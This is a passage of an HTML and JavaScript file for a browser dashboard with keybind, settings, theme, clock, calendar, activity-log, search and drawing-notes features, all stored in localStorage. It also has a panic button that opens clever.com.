              <div class="keybind-item" style="display:flex; justify-content:space-between; align-items:center; background:#1c1c1c; padding:10px; border-radius:5px;">
                <span>Full Screen:</span>
                <input type="text" data-action="fullScreen" class="keybind-input" value="F" readonly style="width:50px; text-align:center; background:#333; color:white; border:none; padding:5px; border-radius:3px;">
              </div>
              <div class="keybind-item" style="display:flex; justify-content:space-between; align-items:center; background:#1c1c1c; padding:10px; border-radius:5px;">
                <span>Zoom In:</span>
                <input type="text" data-action="zoomIn" class="keybind-input" value="=" readonly style="width:50px; text-align:center; background:#333; color:white; border:none; padding:5px; border-radius:3px;">
              </div>
              <div class="keybind-item" style="display:flex; justify-content:space-between; align-items:center; background:#1c1c1c; padding:10px; border-radius:5px;">
                <span>Zoom Out:</span>
                <input type="text" data-action="zoomOut" class="keybind-input" value="-" readonly style="width:50px; text-align:center; background:#333; color:white; border:none; padding:5px; border-radius:3px;">
              </div>
              <div class="keybind-item" style="display:flex; justify-content:space-between; align-items:center; background:#1c1c1c; padding:10px; border-radius:5px;">
                <span>Restart App:</span>
                <input type="text" data-action="restart" class="keybind-input" value="R" readonly style="width:50px; text-align:center; background:#333; color:white; border:none; padding:5px; border-radius:3px;">
              </div>
              <div class="keybind-item" style="display:flex; justify-content:space-between; align-items:center; background:#1c1c1c; padding:10px; border-radius:5px;">
                <span>Toggle Theme:</span>
                <input type="text" data-action="toggleTheme" class="keybind-input" value="T" readonly style="width:50px; text-align:center; background:#333; color:white; border:none; padding:5px; border-radius:3px;">
              </div>
          </div>
          <button id="saveKeybindsBtn" style="background-color:#2ecc71; color:white; margin-top:20px; padding:10px 15px; border-radius:8px; font-weight:bold;">Save Keybinds</button>
          <p style="font-size:0.8em; margin-top:10px; color:#aaa;">Click an input box and press a key to set a new keybind.</p>
      </div>

    </div> <!-- End infoPanelsContainer -->

    <div id="canvasContainer" style="display:none;">
      <!-- Notes UI is now managed within a specific info-panel (#notesPanel) -->
    </div>

  </div> <!-- End dashboard -->

  <script>
    // Utility for notifications/alerts (without sound by default)
    function showAlert(message, type = 'info', duration = 3000) {
      const alertContainer = document.getElementById('dashboardHeader');
      if (!alertContainer) return; // Should not happen in dashboard, but fallback

      const alertBox = document.createElement('div');
      alertBox.className = 'dashboard-notification';
      alertBox.innerHTML = `<strong>${type.charAt(0).toUpperCase() + type.slice(1)}:</strong> ${message}`;

      switch (type) {
        case 'success': alertBox.style.backgroundColor = '#2ecc71'; break;
        case 'error': alertBox.style.backgroundColor = '#e74c3c'; break;
        case 'warning': alertBox.style.backgroundColor = '#f39c12'; alertBox.style.color = 'black'; break;
        case 'info': default: alertBox.style.backgroundColor = '#3498db'; break;
      }

      alertBox.style.animation = 'fadeInSlideDown 0.5s forwards ease-out';
      alertContainer.appendChild(alertBox);

      setTimeout(() => {
        alertBox.style.animation = 'fadeOutUp 0.5s forwards ease-in';
        alertBox.addEventListener('animationend', () => alertBox.remove(), { once: true });
      }, duration);
    }

    // Centralized Activity Logging System
    const activityLogger = {
        logs: JSON.parse(localStorage.getItem('activityLogs') || '[]'),
        log: function(event, detail = {}) {
            const timestamp = new Date().toISOString();
            const logEntry = { timestamp, event, detail };
            this.logs.push(logEntry);
            localStorage.setItem('activityLogs', JSON.stringify(this.logs));
            this.displayLogs(); // Update display if panel is open
            console.log("Activity Log:", logEntry); // For debugging
        },
        displayLogs: function() {
            const logContentDiv = document.getElementById('activityLogContent');
            if (logContentDiv && logContentDiv.style.display !== 'none') {
                logContentDiv.innerHTML = '';
                if (this.logs.length === 0) {
                    logContentDiv.innerHTML = '<p><em>No activity logged yet.</em></p>';
                } else {
                    this.logs.slice().reverse().forEach(entry => { // Display newest first
                        const p = document.createElement('p');
                        p.innerHTML = `<span style="color:#00ffff;">[${new Date(entry.timestamp).toLocaleString()}]</span> <strong>${entry.event}:</strong> <span style="color:#ffcc00;">${JSON.stringify(entry.detail)}</span>`;
                        logContentDiv.appendChild(p);
                    });
                }
            }
        },
        clearLogs: function() {
            this.logs = [];
            localStorage.removeItem('activityLogs');
            this.displayLogs();
            showAlert('Activity logs cleared!', 'info');
        },
        exportLogs: function() {
            const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(this.logs, null, 2));
            const downloadAnchorNode = document.createElement('a');
            downloadAnchorNode.setAttribute("href", dataStr);
            downloadAnchorNode.setAttribute("download", `activity_logs_${new Date().toISOString()}.json`);
            document.body.appendChild(downloadAnchorNode);
            downloadAnchorNode.click();
            downloadAnchorNode.remove();
            showAlert('Activity logs exported!', 'success');
        },
        init: function() {
            // Listen for global clicks for basic tracking
            document.addEventListener('click', (e) => {
                let elementId = e.target.id;
                let elementType = e.target.tagName;
                let elementText = e.target.innerText ? e.target.innerText.trim().substring(0, 50) : '';

                if (e.target.closest('.quick-bar button') || e.target.closest('.global-quick-bar button') || e.target.closest('.login-box button')) {
                    activityLogger.log('Button Click', { id: elementId, text: elementText, tag: elementType });
                    // Increment stats
                    if (dashboard.stats.update) dashboard.stats.update('buttonsPressed');
                } else if (e.target.type === 'checkbox') {
                    activityLogger.log('Toggle Flipped', { id: elementId, state: e.target.checked });
                    if (dashboard.stats.update) dashboard.stats.update('togglesFlipped');
                } else if (e.target.closest('.box') && e.target.tagName === 'H2') {
                    activityLogger.log('Panel Title Click', { text: elementText });
                }
            });
            activityLogger.displayLogs(); // Initial display if panel starts open
        }
    };

    // Dashboard functionality object
    const dashboard = {
      // Initialize all dashboard functionality
      init: function() {
        activityLogger.log('Dashboard Init', { user: document.getElementById('loggedInUser').textContent });
        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initThemeToggle();
        this.initDashboardButtons();
        this.initQuickBar(); // For general dashboard utility buttons
        this.initPanelToggleButtons(); // For info-panels
        this.initNotesPanel();
        this.initRandomFactsQuotes();
        this.initDraggableResizablePanels();
        this.initSettingsPanel();
        this.initTimerStopwatchPanel();
        this.initCalculator();
        this.initUnitConverter();
        this.initStatsTracker();
        this.initMediaPlayer();
        this.initReminders();
        this.initActivityLoginHistoryPanels();
        this.initKeybinds();
        this.updateWifiColors();
        this.initSearchBar(); // New search bar init
        // Load settings from localStorage
        this.applySettings();

        document.getElementById('dashboard').style.opacity = '1'; // Fade in dashboard
        document.getElementById('bodyElement').style.overflow = 'auto'; // Re-enable body scrolling
      },

      panelsState: JSON.parse(localStorage.getItem('dashboardPanelsState') || '{}'),

      // Settings tracking (initial or loaded from storage)
      settings: JSON.parse(localStorage.getItem('dashboardSettings') || '{}'),
      stats: JSON.parse(localStorage.getItem('dashboardStats') || '{}'),
      // Helper to save settings
      saveSettings: function() {
          localStorage.setItem('dashboardSettings', JSON.stringify(this.settings));
      },

      // Helper to update and save stats
      updateStats: function(key) {
          if (!this.stats[key]) {
              this.stats[key] = 0;
          }
          this.stats[key]++;
          localStorage.setItem('dashboardStats', JSON.stringify(this.stats));
          this.displayStats(); // Update the UI if the panel is open
      },
      displayStats: function() {
          const statsPanel = document.getElementById('statsPanel');
          if (statsPanel && statsPanel.style.display === 'block') {
              document.getElementById('statsButtonsPressed').textContent = this.stats.buttonsPressed || 0;
              document.getElementById('statsTogglesFlipped').textContent = this.stats.togglesFlipped || 0;
              document.getElementById('statsPanelsOpened').textContent = this.stats.panelsOpened || 0;
              document.getElementById('statsPanelsClosed').textContent = this.stats.panelsClosed || 0;
              document.getElementById('statsNotesCleared').textContent = this.stats.notesCleared || 0;
              document.getElementById('statsExportsMade').textContent = this.stats.exportsMade || 0;
          }
      },
      resetStats: function() {
          if (confirm('Are you sure you want to reset all dashboard statistics?')) {
              this.stats = {};
              localStorage.removeItem('dashboardStats');
              this.displayStats();
              showAlert('All statistics have been reset.', 'info');
              activityLogger.log('Stats Reset');
          }
      },

      applySettings: function() {
          // Theme Toggle
          const themeToggleInput = document.getElementById('themeToggle');
          const settingsThemeToggle = document.getElementById('settingsThemeToggle');
          if (this.settings.theme === 'light') {
              document.body.classList.add('light-theme');
              themeToggleInput.innerText = '☀️ Light Mode';
              if(settingsThemeToggle) settingsThemeToggle.checked = true;
          } else {
              document.body.classList.remove('light-theme');
              themeToggleInput.innerText = '🌙 Dark Mode';
              if(settingsThemeToggle) settingsThemeToggle.checked = false;
          }
          if(settingsThemeToggle) {
              document.getElementById('settingsThemeLabel').textContent = this.settings.theme === 'light' ? 'Light' : 'Dark';
          }

          // Animation Toggle
          const animationToggle = document.getElementById('animationToggle');
          if (animationToggle) {
              animationToggle.checked = this.settings.animations === false; // Checked means disabled
              this.toggleAnimations(animationToggle.checked);
          }

          // Logging Level
          const loggingLevelSelect = document.getElementById('loggingLevel');
          if (loggingLevelSelect && this.settings.loggingLevel) {
              loggingLevelSelect.value = this.settings.loggingLevel;
          }

          // Dashboard Layout
          const dashboardLayoutSelect = document.getElementById('dashboardLayout');
          if (dashboardLayoutSelect && this.settings.dashboardLayout) {
              dashboardLayoutSelect.value = this.settings.dashboardLayout;
              this.setLayout(this.settings.dashboardLayout); // Apply layout immediately
          }

          // Default Panel on Startup
          const defaultPanelSelect = document.getElementById('defaultPanelOnStartup');
          if (defaultPanelSelect && this.settings.defaultPanelOnStartup && this.settings.defaultPanelOnStartup !== 'none') {
              defaultPanelSelect.value = this.settings.defaultPanelOnStartup;
              setTimeout(() => this.togglePanel(this.settings.defaultPanelOnStartup), 500); // Open after dashboard is loaded
          }

          // Auto-save Notes (Checkbox only affects initial state of checkbox)
          const autoSaveNotes = document.getElementById('autoSaveNotes');
          if (autoSaveNotes && typeof this.settings.autoSaveNotes !== 'undefined') {
              autoSaveNotes.checked = this.settings.autoSaveNotes;
              if (this.notes.textarea && autoSaveNotes.checked) {
                  this.notes.textarea.value = localStorage.getItem('textNotesContent') || '';
              }
          }

          // Enable Tooltips
          const enableTooltips = document.getElementById('enableTooltips');
          if (enableTooltips && typeof this.settings.enableTooltips !== 'undefined') {
              enableTooltips.checked = this.settings.enableTooltips;
              // No direct effect in this code, just sets checkbox state
          }

          // High Contrast Mode
          const enableHighContrast = document.getElementById('enableHighContrast');
          if (enableHighContrast && typeof this.settings.highContrast !== 'undefined') {
              enableHighContrast.checked = this.settings.highContrast;
              this.toggleHighContrast(enableHighContrast.checked);
          }

          // Language Select
          const languageSelect = document.getElementById('languageSelect');
          if (languageSelect && this.settings.language) {
              languageSelect.value = this.settings.language;
              // Implementation to change text dynamically would go here
          }

          // Enable Touch Gestures
          const enableGestures = document.getElementById('enableGestures');
          if (enableGestures && typeof this.settings.touchGestures !== 'undefined') {
              enableGestures.checked = this.settings.touchGestures;
              // Implement touch gestures handling
          }

          // Cloud Sync (sets checkbox state)
          const dataSync = document.getElementById('dataSync');
          if (dataSync && typeof this.settings.cloudSync !== 'undefined') {
              dataSync.checked = this.settings.cloudSync;
              // No actual cloud sync implemented
          }

          // Auto Update (sets checkbox state)
          const autoUpdate = document.getElementById('autoUpdate');
          if (autoUpdate && typeof this.settings.autoUpdate !== 'undefined') {
              autoUpdate.checked = this.settings.autoUpdate;
          }

          // Initialize Notes settings if any exist
          if (this.notes.ctx && this.settings.notesPenColor) {
              this.notes.ctx.strokeStyle = this.settings.notesPenColor;
              document.getElementById('drawColorPicker').value = this.settings.notesPenColor;
          }
          if (this.notes.ctx && this.settings.notesPenThickness) {
              this.notes.ctx.lineWidth = this.settings.notesPenThickness;
              document.getElementById('drawThicknessSlider').value = this.settings.notesPenThickness;
          }
      },

      toggleAnimations: function(disable) {
          // Simple example: toggle the global CSS for animations
          const styleSheet = document.styleSheets[0]; // Assuming your main CSS
          // Look for an animation disabling class, or inject/remove
          if (disable) {
              document.body.classList.add('no-animations');
              const animationStyles = `
                .no-animations * {
                    transition: none !important;
                    animation: none !important;
                }
              `;
              let existingRule = Array.from(styleSheet.cssRules).find(rule => rule.cssText.includes('.no-animations'));
              if (!existingRule) {
                  styleSheet.insertRule(animationStyles, styleSheet.cssRules.length);
              }
          } else {
              document.body.classList.remove('no-animations');
              let ruleIndex = Array.from(styleSheet.cssRules).findIndex(rule => rule.cssText.includes('.no-animations'));
              if (ruleIndex > -1) {
                  styleSheet.deleteRule(ruleIndex);
              }
          }
      },

      toggleHighContrast: function(enable) {
          if (enable) {
              document.body.classList.add('high-contrast-theme');
              const highContrastStyle = `
                .high-contrast-theme {
                    background-color: #000 !important;
                    color: #fff !important;
                }
                .high-contrast-theme .login-box,
                .high-contrast-theme .box,
                .high-contrast-theme .info-panel {
                    background-color: #000 !important;
                    border-color: #fff !important;
                    box-shadow: 0 0 10px #fff !important;
                }
                .high-contrast-theme button,
                .high-contrast-theme a {
                    background-color: #000 !important;
                    color: #00ff00 !important;
                    border: 1px solid #00ff00 !important;
                }
                .high-contrast-theme button:hover,
                .high-contrast-theme a:hover {
                    background-color: #00ff00 !important;
                    color: #000 !important;
                }
                .high-contrast-theme h1, .high-contrast-theme h2,
                .high-contrast-theme .school-info-label {
                    color: #00ff00 !important;
                }
                .high-contrast-theme .wifi-entry div {
                  background-color: #000 !important;
                  border: 1px dashed #00ff00 !important;
                  color: #00ff00 !important;
                }
                .high-contrast-theme #dashboardHeader {
                  background-color: #000 !important;
                  color: #00ff00 !important;
                  border-bottom: 2px solid #00ff00 !important;
                }
              `;
              let existingRule = Array.from(document.styleSheets[0].cssRules).find(rule => rule.cssText.includes('.high-contrast-theme'));
              if (!existingRule) {
                  document.styleSheets[0].insertRule(highContrastStyle, document.styleSheets[0].cssRules.length);
              }
          } else {
              document.body.classList.remove('high-contrast-theme');
              let ruleIndex = Array.from(document.styleSheets[0].cssRules).findIndex(rule => rule.cssText.includes('.high-contrast-theme'));
              if (ruleIndex > -1) {
                  document.styleSheets[0].deleteRule(ruleIndex);
              }
          }
      },

      setLayout: function(layoutType) {
          const mainGrid = document.getElementById('mainGrid');
          const updatesNotifications = document.getElementById('updatesNotifications');

          if (layoutType === 'grid') {
              mainGrid.style.flexDirection = 'row';
              mainGrid.style.flexWrap = 'wrap';
              updatesNotifications.style.flexDirection = 'row';
              updatesNotifications.style.flexWrap = 'wrap';
          } else if (layoutType === 'rows') {
              mainGrid.style.flexDirection = 'column';
              mainGrid.style.flexWrap = 'nowrap';
              updatesNotifications.style.flexDirection = 'column';
              updatesNotifications.style.flexWrap = 'nowrap';
          }
          // Note: drag-and-drop will override 'flex' behavior somewhat, this sets the *default* flow.
      },

      // Initialize session timer
      initSessionTimer: function() {
        let sessionSeconds = 0;
        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }

        function updateSessionTime() {
          sessionSeconds++;
          document.getElementById('sessionTime').innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
        }

        updateSessionTime();
        setInterval(updateSessionTime, 1000);
      },

      // Initialize real-time clock
      initClock: function() {
        let is24HourFormat = this.settings.timeFormat24h || false; // Load from settings

        const timeFormatToggle = document.getElementById('timeFormatToggle');
        if (timeFormatToggle) {
          timeFormatToggle.checked = is24HourFormat;
          timeFormatToggle.addEventListener('change', () => {
            is24HourFormat = timeFormatToggle.checked;
            this.settings.timeFormat24h = is24HourFormat;
            this.saveSettings();
            updateClockAndDate();
            activityLogger.log('Time Format Toggle', { format24h: is24HourFormat });
          });
        }

        function updateClockAndDate() {
          const now = new Date();
          const timeOptions = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: !is24HourFormat };
          const timeStr = now.toLocaleTimeString(undefined, timeOptions);
          const dateStr = now.toLocaleDateString(undefined, { weekday: 'short', month: 'short', day: 'numeric', year: 'numeric' }); // More concise date

          // For login page datetime box
          const loginDateTimeDisplay = document.getElementById('currentDateTime');
          if (loginDateTimeDisplay) {
            loginDateTimeDisplay.innerText = `${timeStr} | ${dateStr}`;
          }

          // For dashboard header
          const dashboardRealTimeClock = document.getElementById('realTimeClock');
          const dashboardRealDate = document.getElementById('realDate');
          if (dashboardRealTimeClock) {
            dashboardRealTimeClock.innerText = '🕒 ' + timeStr;
          }
          if (dashboardRealDate) {
            dashboardRealDate.innerText = '📅 ' + dateStr;
          }
        }

        updateClockAndDate();
        setInterval(updateClockAndDate, 1000);
      },

      // Generate calendar
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        if (!calendar) return; // Ensure calendar element exists before proceeding
        calendar.innerHTML = '';
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDay = new Date(year, month, 1).getDay();
        const lastDate = new Date(year, month + 1, 0).getDate();

        for (let i = 0; i < firstDay; i++) {
          const empty = document.createElement('div');
          calendar.appendChild(empty);
        }

        for (let i = 1; i <= lastDate; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) cell.classList.add('today');
          calendar.appendChild(cell);
        }
      },

      // Initialize theme toggle
      initThemeToggle: function() {
        const themeBtn = document.getElementById('themeToggle');
        if (!themeBtn) return;
        themeBtn.addEventListener('click', () => {
          document.body.classList.toggle('light-theme');
          const isLightTheme = document.body.classList.contains('light-theme');
          themeBtn.innerText = isLightTheme ? '☀️ Light Mode' : '🌙 Dark Mode';
          this.settings.theme = isLightTheme ? 'light' : 'dark';
          this.saveSettings();
          activityLogger.log('Theme Toggle', { theme: this.settings.theme });

          const settingsThemeToggle = document.getElementById('settingsThemeToggle');
          if (settingsThemeToggle) {
              settingsThemeToggle.checked = isLightTheme;
              document.getElementById('settingsThemeLabel').textContent = isLightTheme ? 'Light' : 'Dark';
          }
        });
        // Sync with settings panel toggle
        const settingsThemeToggle = document.getElementById('settingsThemeToggle');
        if (settingsThemeToggle) {
            settingsThemeToggle.addEventListener('change', () => {
                document.body.classList.toggle('light-theme', settingsThemeToggle.checked);
                themeBtn.innerText = settingsThemeToggle.checked ? '☀️ Light Mode' : '🌙 Dark Mode';
                this.settings.theme = settingsThemeToggle.checked ? 'light' : 'dark';
                this.saveSettings();
                document.getElementById('settingsThemeLabel').textContent = settingsThemeToggle.checked ? 'Light' : 'Dark';
                activityLogger.log('Theme Toggle (Settings)', { theme: this.settings.theme });
            });
        }
      },

      // Global Dashboard buttons
      initDashboardButtons: function() {
        document.getElementById('panicBtn').addEventListener('click', () => {
          activityLogger.log('Panic Button');
          window.open('https://clever.com', '_blank');
        });

        document.getElementById('restartBtn').addEventListener('click', () => {
          activityLogger.log('Restart Button');
          if(confirm('Are you sure you want to kill the page (restart)?')) {
            document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#f9f2dc; font-family:'Montserrat', sans-serif; font-size:24px;">Page has been killed. Restart to continue.</div>`;
          }
        });

        document.getElementById('fullScreenBtn').addEventListener('click', () => {
          activityLogger.log('Full Screen Button');
          if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(err => {
              showAlert(`Error attempting to enable full-screen mode: ${err.message}`, 'error');
            });
          } else {
            document.exitFullscreen();
          }
        });

        let zoomLevel = 1;
        const zoomStep = 0.1;
        const minZoom = 0.5;
        const maxZoom = 2;

        document.getElementById('zoomInBtn').addEventListener('click', () => {
          activityLogger.log('Zoom In Button');
          if (zoomLevel < maxZoom) {
            zoomLevel += zoomStep;
            document.body.style.zoom = zoomLevel;
          }
        });

        document.getElementById('zoomOutBtn').addEventListener('click', () => {
          activityLogger.log('Zoom Out Button');
          if (zoomLevel > minZoom) {
            zoomLevel -= zoomStep;
            document.body.style.zoom = zoomLevel;
          }
        });

        document.getElementById('logoutBtn').addEventListener('click', () => {
          activityLogger.log('Logout Button');
          if (confirm('Are you sure you want to log out?')) {
            localStorage.removeItem('loggedInUser'); // Clear login state
            localStorage.removeItem('loggedInID'); // Clear login ID
            window.location.reload(); // Reload the page to show the login screen
          }
        });

        // Download Activity Logs
        document.getElementById('downloadActivityLogsBtn').addEventListener('click', () => {
            activityLogger.exportLogs();
            if (this.stats.update) this.stats.update('exportsMade');
        });
      },

      // Quick bar buttons that open info panels (below main rows)
      initPanelToggleButtons: function() {
        document.getElementById('settingsBtn').addEventListener('click', () => this.togglePanel('settingsPanel'));
        document.getElementById('notesBtn').addEventListener('click', () => this.togglePanel('notesPanel'));
        document.getElementById('timerStopwatchBtn').addEventListener('click', () => this.togglePanel('timerStopwatchPanel'));
        document.getElementById('calculatorBtn').addEventListener('click', () => this.togglePanel('calculatorPanel'));
        document.getElementById('unitConverterBtn').addEventListener('click', () => this.togglePanel('unitConverterPanel'));
        document.getElementById('statsBtn').addEventListener('click', () => {
          this.togglePanel('statsPanel');
          this.displayStats(); // Update stats display when panel opens
        });
        document.getElementById('mediaBtn').addEventListener('click', () => this.togglePanel('mediaPanel'));
        document.getElementById('reminderBtn').addEventListener('click', () => this.togglePanel('reminderPanel'));
        document.getElementById('activityLogBtn').addEventListener('click', () => {
          this.togglePanel('activityLogPanel');
          activityLogger.displayLogs(); // Ensure logs are up-to-date
        });
        document.getElementById('loginHistoryBtn').addEventListener('click', () => {
          this.togglePanel('loginHistoryPanel');
          this.displayLoginHistory(); // Show latest login data
        });
        document.getElementById('keybindsBtn').addEventListener('click', () => this.togglePanel('keybindsPanel'));

      },

      initSearchBar: function() {
          const searchBar = document.getElementById('dashboardSearchBar');
          searchBar.addEventListener('keydown', (e) => {
              if (e.key === 'Enter') {
                  const query = searchBar.value.toLowerCase().trim();
                  if (query) {
                      this.searchDashboard(query);
                  }
              }
          });
      },
      searchDashboard: function(query) {
          activityLogger.log('Search Dashboard', { query: query });
          // Panels (boxes and info-panels) to search within
          const allPanels = document.querySelectorAll('.box, .info-panel');
          let foundPanel = null;

          // Simple search: check panel IDs and H2 content
          for (let panel of allPanels) {
              const panelId = panel.id.toLowerCase();
              const panelTitle = panel.querySelector('h2')?.textContent.toLowerCase() || '';

              if (panelId.includes(query) || panelTitle.includes(query)) {
                  // If it's an info-panel that should be hidden by default
                  if (panel.classList.contains('info-panel')) {
                      this.togglePanel(panel.id); // Show the panel
                  } else { // It's one of the main grid boxes, ensure it's visible.
                      panel.style.display = 'block'; // Make sure main boxes are visible
                  }
                  panel.scrollIntoView({ behavior: 'smooth', block: 'center' });
                  panel.style.transition = 'box-shadow 0.3s ease-in-out';
                  panel.style.boxShadow = '0 0 25px rgba(255, 255, 0, 0.8)'; // Highlight
                  setTimeout(() => {
                      panel.style.boxShadow = ''; // Remove highlight after a brief moment
                  }, 3000);
                  foundPanel = panel;
                  break;
              }
          }
          if (!foundPanel) {
              showAlert(`No section found for "${query}".`, 'warning');
          }
          searchBar.value = ''; // Clear search bar after attempt
      },


      notes: {
          canvas: null,
          ctx: null,
          drawing: false,
          currentLine: [], // Stores points of the current drawing path
          paths: [],     // Stores all completed drawing paths for undo/redo
          redoStack: [], // Stores undone paths
          currentTool: 'draw', // 'draw' or 'eraser'
          color: '#ff914d',
          thickness: 2,
          textarea: null,
          textVisible: false,

          init: function() {
              this.canvas = document.getElementById('notesCanvas');
              this.ctx = this.canvas.getContext('2d');
              this.ctx.fillStyle = '#fff';
              this.ctx.fillRect(0, 0, this.canvas.width, this.canvas.height); // Initial white background
              this.ctx.lineCap = 'round';
              this.ctx.lineJoin = 'round'; // Improved line appearance
              this.textarea = document.getElementById('textNotesArea');

              // Load existing canvas drawing
              const savedCanvas = localStorage.getItem('notesCanvasImage');
              if (savedCanvas) {
                  const img = new Image();
                  img.onload = () => this.ctx.drawImage(img, 0, 0);
                  img.src = savedCanvas;
              }
              // Load text notes
              const savedTextNotes = localStorage.getItem('textNotesContent');
              if (savedTextNotes) {
                  this.textarea.value = savedTextNotes;
              }

              this.addEventListeners();
          },

          saveDrawing: function() {
            localStorage.setItem('notesCanvasImage', this.canvas.toDataURL());
            activityLogger.log('Notes Saved', { type: 'drawing' });
          },
          saveText: function() {
              localStorage.setItem('textNotesContent', this.textarea.value);
              activityLogger.log('Notes Saved', { type: 'text' });
          },

          getPos: function(evt) {
              const rect = this.canvas.getBoundingClientRect();
              const scaleX = this.canvas.width / rect.width;
              const scaleY = this.canvas.height / rect.height;
              return {
                  x: ((evt.clientX || evt.touches[0].clientX) - rect.left) * scaleX,
                  y: ((evt.clientY || evt.touches[0].clientY) - rect.top) * scaleY
              };
          },

          startDraw: function(e) {
              if (this.textVisible) return;
              this.drawing = true;
              this.currentLine = []; // Clear current line for a new path
              const pos = this.getPos(e);
              this.currentLine.push(pos);
              this.ctx.beginPath();
              this.ctx.moveTo(pos.x, pos.y);
              e.preventDefault();
              this.redoStack = []; // Clear redo stack on new drawing
              dashboard.updateUndoRedoButtons();
          },

          drawingHandler: function(e) {
              if (!this.drawing || this.textVisible) return;
              const pos = this.getPos(e);
              this.currentLine.push(pos);
              this.ctx.lineTo(pos.x, pos.y);

              if (this.currentTool === 'eraser') {
                  this.ctx.strokeStyle = '#fff'; // Assuming white background
                  this.ctx.lineWidth = this.thickness + 5; // Wider eraser
              } else {
                  this.ctx.strokeStyle = this.color;
                  this.ctx.lineWidth = this.thickness;
              }
              this.ctx.stroke();
              e.preventDefault();
          },

          endDraw: function() {
              if (!this.drawing) return; // Prevent saving empty paths on stray mouseup
              this.drawing = false;
              if (this.currentLine.length > 0) {
                  this.paths.push({
                      path: this.currentLine,
                      color: this.currentTool === 'eraser' ? '#fff' : this.color,
                      thickness: this.currentTool === 'eraser' ? this.thickness + 5 : this.thickness
                  });
              }
              this.saveDrawing(); // Save the canvas state after each stroke
              dashboard.updateUndoRedoButtons();
          },

          redrawCanvas: function() {
              this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
              this.ctx.fillStyle = '#fff';
              this.ctx.fillRect(0, 0, this.canvas.width, this.canvas.height);

              this.paths.forEach(pathData => {
                  this.ctx.beginPath();
                  this.ctx.strokeStyle = pathData.color;
                  this.ctx.lineWidth = pathData.thickness;
                  if (pathData.path.length > 0) {
                      this.ctx.moveTo(pathData.path[0].x, pathData.path[0].y);
                      for (let i = 1; i < pathData.path.length; i++) {
                          this.ctx.lineTo(pathData.path[i].x, pathData.path[i].y);
                      }
                  }
                  this.ctx.stroke();
              });
              this.saveDrawing(); // Save state after redraw
          },

          addEventListeners: function() {
              // Drawing event listeners
              ['mousedown', 'touchstart'].forEach(evt => this.canvas.addEventListener(evt, (e) => this.startDraw(e)));
              ['mousemove', 'touchmove'].forEach(evt => this.canvas.addEventListener(evt, (e) => this.drawingHandler(e)));
              ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evt => this.canvas.addEventListener(evt, () => this.endDraw()));

              // Control buttons
              document.getElementById('clearCanvasBtn').addEventListener('click', () => {
                  this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
                  this.ctx.fillStyle = '#fff';
                  this.ctx.fillRect(0, 0, this.canvas.width, this.canvas.height);
                  this.paths = [];
                  this.redoStack = [];
                  this.saveDrawing();
                  dashboard.updateUndoRedoButtons();
                  activityLogger.log('Clear Canvas');
                  dashboard.updateStats('notesCleared');
              });

              document.getElementById('closeNotesBtn').addEventListener('click', () => {
                  document.getElementById('notesPanel').style.display = 'none';
                  this.textarea.style.display = 'none'; // Ensure text area is hidden on close
                  activityLogger.log('Close Notes Panel');
              });

              document.getElementById('exportNotesBtn').addEventListener('click', () => {
                  const link = document.createElement('a');
                  link.download = `notes_drawing_${new Date().toISOString().split('T')[0]}.png`;
                  link.href = this.canvas.toDataURL('image/png');
                  document.body.appendChild(link);
                  link.click();
                  document.body.removeChild(link);
                  showAlert('Drawing notes exported!', 'success');
                  activityLogger.log('Export Notes', { type: 'drawing' });
                  dashboard.updateStats('exportsMade');
              });

              document.getElementById('drawColorPicker').addEventListener('input', (e) => {
                  this.color = e.target.value;
                  this.currentTool = 'draw';
                  activityLogger.log('Notes Pen Color Change', { color: this.color });
                  // Store in settings
                  dashboard.settings.notesPenColor = this.color;
                  dashboard.saveSettings();
              });

              document.getElementById('drawThicknessSlider').addEventListener('input', (e) => {
                  this.thickness = parseInt(e.target.value);
                  this.currentTool = 'draw';
                  activityLogger.log('Notes Pen Thickness Change', { thickness: this.thickness });
                   // Store in settings
                  dashboard.settings.notesPenThickness = this.thickness;
                  dashboard.saveSettings();
              });

              document.getElementById('toggleDrawMode').addEventListener('click', () => {
                  this.currentTool = 'draw';
                  this.textarea.style.display = 'none';
                  this.canvas.style.display = 'block';
                  this.textVisible = false;
                  document.getElementById('exportTextNotesBtn').style.display = 'none';
                  showAlert('Switched to Drawing Mode', 'info', 1500);
                  activityLogger.log('Toggle Draw Mode');
              });

              document.getElementById('toggleTextMode').addEventListener('click', () => {
                  this.textarea.style.display = 'block';
                  this.canvas.style.display = 'none';
                  this.textVisible = true;
                  document.getElementById('exportTextNotesBtn').style.display = 'block';
                  showAlert('Switched to Text Mode', 'info', 1500);
                  activityLogger.log('Toggle Text Mode');
              });

              document.getElementById('undoDrawBtn').addEventListener('click', () => dashboard.undoDraw());
              document.getElementById('redoDrawBtn').addEventListener('click', () => dashboard.redoDraw());

              document.getElementById('eraserBtn').addEventListener('click', () => {
                  this.currentTool = 'eraser';
                  this.textarea.style.display = 'none';
                  this.canvas.style.display = 'block';
                  this.textVisible = false;
                  document.getElementById('exportTextNotesBtn').style.display = 'none';
                  showAlert('Eraser selected', 'info', 1500);
                  activityLogger.log('Eraser Selected');
              });

              this.textarea.addEventListener('input', () => {
                  if (document.getElementById('autoSaveNotes').checked) {
                      this.saveText();
                  }
                  activityLogger.log('Text Notes Input');
              });

              document.getElementById('exportTextNotesBtn').addEventListener('click', () => {
                  const textContent = this.textarea.value;
                  if (!textContent) {
                      showAlert('No text to export!', 'warning');
                      return;
                  }
